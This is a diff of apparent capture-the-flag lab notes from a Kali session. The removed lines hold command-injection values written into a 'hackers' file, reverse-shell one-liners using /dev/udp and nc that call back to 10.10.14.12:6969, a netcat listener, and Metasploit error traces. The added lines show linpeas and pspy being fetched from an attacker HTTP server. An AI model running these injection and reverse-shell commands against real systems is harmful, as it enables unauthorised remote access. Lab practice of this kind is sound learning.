@@ -1,73 +1,4 @@
 
-created a recon folder
-
-hippoeug@kali:~$ cat hackers
-1.2.3.4
-
-hippoeug@kali:~$ ./test.sh
-
-hippoeug@kali:~$ ls recon
-1.2.3.4.nmap
-hippoeug@kali:~$ cat 1.2.3.4.nmap
-cat: 1.2.3.4.nmap: No such file or directory
-hippoeug@kali:~$ cd recon
-hippoeug@kali:~/recon$ cat 1.2.3.4.nmap
-# Nmap 7.91 scan initiated Sun Feb  7 22:25:16 2021 as: nmap --top-ports 10 -oN recon/1.2.3.4.nmap 1.2.3.4
-# Nmap done at Sun Feb  7 22:25:19 2021 -- 1 IP address (0 hosts up) scanned in 3.10 seconds
-hippoeug@kali:~/recon$ 
-
-
-
-
-
-
-
-hippoeug@kali:~$ sh -c "whoami;pwd"
-hippoeug
-/home/hippoeug
-
-
-
-echo "1.2.3.4;/bin/sh -i;" >> hackers
-echo "1.2.3.4;bin/sh -i 2>&1# >> hackers
-[-] Session manipulation failed: Unmatched double quote: "echo \"1.2.3.4;bin/sh -i 2>&1# >> hackers" ["/usr/lib/ruby/2.7.0/shellwords.rb:84:in `block in shellsplit'", "/usr/lib/ruby/2.7.0/shellwords.rb:82:in `scan'", "/usr/lib/ruby/2.7.0/shellwords.rb:82:in `shellsplit'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:581:in `run_single'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:755:in `_interact_stream'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:739:in `_interact'", "/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1545:in `cmd_sessions'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:476:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `run_single'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:223:in `cmd_exploit'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:476:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "/usr/bin/msfconsole:23:in `<main>'"]
-msf6 exploit(multi/handler) > 
-
-
-
-
-
-
-
-echo "1.2.3.4;bin/sh -i #" >> hackers
-
-
-
-
-
-echo ignore ignore ;"sh -i >& /dev/udp/10.10.14.12/6969 0>&1
-[-] Session manipulation failed: Unmatched double quote: "echo ignore ignore ;\"sh -i >& /dev/udp/10.10.14.12/6969 0>&1" ["/usr/lib/ruby/2.7.0/shellwords.rb:84:in `block in shellsplit'", "/usr/lib/ruby/2.7.0/shellwords.rb:82:in `scan'", "/usr/lib/ruby/2.7.0/shellwords.rb:82:in `shellsplit'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:581:in `run_single'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:755:in `_interact_stream'", "/usr/share/metasploit-framework/lib/msf/base/sessions/command_shell.rb:739:in `_interact'", "/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1545:in `cmd_sessions'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:476:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `run_single'", "/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:223:in `cmd_exploit'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_command'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:476:in `block in run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `each'", "/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:470:in `run_single'", "/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "/usr/bin/msfconsole:23:in `<main>'"]
-msf6 exploit(multi/handler) > 
-
-
-echo ignore ignore ;"/bin/sh | nc 10.10.14.12 6969" >> hackers
-ignore ignore
-/bin/sh: 17: /bin/sh | nc 10.10.14.12 6969: not found
-
-
-echo "ignore ignore ;"sh -i >& /dev/udp/10.10.14.12/6969 0>&1"" >> hackers
-/bin/sh: 21: Syntax error: Bad fd number
-[*] 10.129.72.251 - Command shell session 11 closed.
-
-
-
-
-hippoeug@kali:~$ nc -lvnp 6969
-listening on [any] 6969 ...
-
-
-
-echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers
 
 
 
@@ -76,9 +7,14 @@ echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers
 
 
 
-=================
 
 
+
+
+
+=================================================================
+
+hippoeug@kali:~/Documents$ sudo python -m SimpleHTTPServer 80
 
 pwd
 /home/kid
@@ -96,15 +32,8 @@ user.txt
 ./linpeas
 /bin/sh: 70: ./linpeas: Permission denied
 
-
 chmod +x linpeas
 ./linpeas
-
-
-
-
-
-
 
 
 curl -o pspy http://10.10.14.12/pspy64
@@ -112,29 +41,8 @@ curl -o pspy http://10.10.14.12/pspy64
                                  Dload  Upload   Total   Spent    Left  Speed
 100 3006k  100 3006k    0     0  1000k      0  0:00:03  0:00:03 --:--:-- 1000k
 
-
-
-
-
-
-hippoeug@kali:~/Documents$ sudo python -m SimpleHTTPServer 80
-
-
-
 ./pspy
 sh: 27: ./pspy: Permission denied
 chmod +x pspy
 ./pspy
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
-
-
-
-
-
-
-
-
-
-
-
